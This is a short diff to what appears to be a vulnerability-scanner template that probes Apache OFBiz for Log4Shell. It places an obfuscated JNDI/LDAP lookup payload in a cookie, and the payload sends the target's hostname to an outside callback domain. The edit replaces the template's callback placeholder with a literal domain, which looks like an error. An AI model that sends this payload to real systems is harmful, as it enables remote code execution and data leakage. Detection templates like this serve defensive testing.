@@ -33,7 +33,7 @@ http:
       - |
         GET /webtools/control/main HTTP/1.1
         Host: {{Hostname}}
-        Cookie: OFBiz.Visitor=${jndi:ldap://${:-{{rand1}}}${:-{{rand2}}}.${hostName}.cookie.{{interactsh-url}}}
+        Cookie: OFBiz.Visitor=${jndi:ldap://${:-{{rand1}}}${:-{{rand2}}}.${hostName}.cookie.interactsh-url.com}
 
     matchers-condition: and
     matchers:
